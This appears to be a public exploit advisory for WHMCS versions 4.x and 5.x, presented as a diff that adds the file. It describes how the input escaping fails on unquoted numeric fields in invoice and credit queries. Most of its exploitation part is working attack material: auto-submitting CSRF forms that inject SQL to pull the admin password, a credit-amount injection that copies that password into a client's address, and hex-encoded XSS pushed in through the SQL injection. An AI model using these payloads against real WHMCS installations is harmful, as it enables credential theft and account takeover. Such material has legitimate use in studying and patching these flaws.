@@ -1,0 +1,149 @@
+# Exploit Title: WHMCS v4.x & v5.x - Multiple Web Vulnerabilities
+# Date: 2013-12-10
+# Exploit Author: ahwak2000
+# Vendor Homepage: http://whmcs.com/
+# Version: 4.x , 5.x
+# Tested on: win 7
+
++------------------+ 
+|   Vulnerability  | 
++------------------+ 
+
+File : includes\dbfunctions.php 
+
+function db_escape_string($string) {
+
+$string = mysql_real_escape_string($string);
+
+return $string;
+
+}
++------------------+ 
+|   Description    | 
++------------------+ 
+
+the script use this function to secure the input
+the function disable only the ' and "
+but we can bypass it  if the query don't use '
+
+
++------------+ 
+|   Example  | 
++------------+ 
+
+file : admin/invoices.php
+[...]
+$query = "UPDATE tblinvoices SET credit=credit-" . db_escape_string($removecredit) . " WHERE id='" . db_escape_string($id) . "'";
+				full_query($query);
+[...]
+
++------------+ 
+|Exploitation| 
++------------+ 
+
+CSRF to SQL And Bypass Token
+<html>
+    <body onload="submitForm()">
+    <form name="myForm" id="myForm"
+    action="http://localhost/whmcs5214/admin/invoices.php" method="post">
+    <input type="hidden" name="token" value="ahwak2000">
+    <input type="hidden" name="id" value="1">
+    <input type="hidden" name="removecredit" value="-99,invoicenum=(select password from tbladmins limit 0,1)">
+    <input type="hidden" name="action" value="edit">
+    </form>
+    <script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+
+OR
+
+
+<html>
+    <body onload="submitForm()">
+    <form name="myForm" id="myForm"
+    action="http://localhost/whmcs5214/admin/invoices.php" method="post">
+    <input type="hidden" name="token" value="ahwak2000">
+    <input type="hidden" name="id" value="1">
+    <input type="hidden" name="addcredit" value="-99,invoicenum=(select password from tbladmins limit 0,1)">
+    <input type="hidden" name="action" value="edit">
+    </form>
+    <script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
++------------+ 
+|   Example 2| 
++------------+ 
+
+file : includes/invoicefunctions.php
+
+function applyCredit($invoiceid, $userid, $amount="", $noemail = "") {
+	$query = "UPDATE tblinvoices SET credit=credit+" . db_escape_string($amount) . " WHERE id='" . mysql_real_escape_string($invoiceid) . "'";
+	full_query($query);
+	$query = "UPDATE tblclients SET credit=credit-" . db_escape_string($amount) . " WHERE id='" . mysql_real_escape_string($userid) . "'";
+	full_query($query);
+[...]
+	}
+
+}
+
+File: /viewinvoice.php
+if ($invoice->getData("status") == "Unpaid" && 0 < $creditbal) {
+	
+	$creditamount = $whmcs->get_req_var("creditamount");
+	if ($whmcs->get_req_var("applycredit") && 0 < $creditamount) {
+		check_token();
+
+		if ($creditbal < $creditamount) {
+			echo $_LANG['invoiceaddcreditovercredit'];
+			exit();
+		}
+		else {
+			if ($balance < $creditamount) {
+				echo $_LANG['invoiceaddcreditoverbalance'];
+				exit();
+			}
+			else {
+			
+				applyCredit($invoiceid, $invoice->getData("userid"), $creditamount);
+			}
+		}
+
+		redir("id=" . $invoiceid);
+	}
+
+	$smartyvalues['manualapplycredit'] = true;
+	$smartyvalues['totalcredit'] = formatCurrency($creditbal) . generate_token("form");
+
+	if (!$creditamount) {
+		$creditamount = ($balance <= $creditbal ? $balance : $creditbal);
+	}
+
+	$smartyvalues['creditamount'] = $creditamount;
+}
++------------+ 
+|Exploitation| 
++------------+ 
+Go to http://127.0.0.1/whmcs5214/viewinvoice.php?id=1  <~ edit
+
+if client have creditt and when he want to pay with credit 
+
+in the "Enter the amount to apply:" put 0.01,Address2=(SELECT password from tbladmins limit 0,1)
+
+the admin password will be in the client address
+
+
++-----------------+
+sql => xss
+
+SQL can convert to XSS 
+Must Encode XSS to Hex
+Example :
+
+(SELECT 0x3C7363726970743E616C6572742827616877616B3230303027293B3C2F7363726970743E) //<script>alert('ahwak2000');</script>
+
+SQL can be modified to work when all members and supervisors
+(SELECT 0x3C7363726970743E616C6572742827616877616B3230303027293B3C2F7363726970743E)# <~
+
++-------------------+
+
+./END
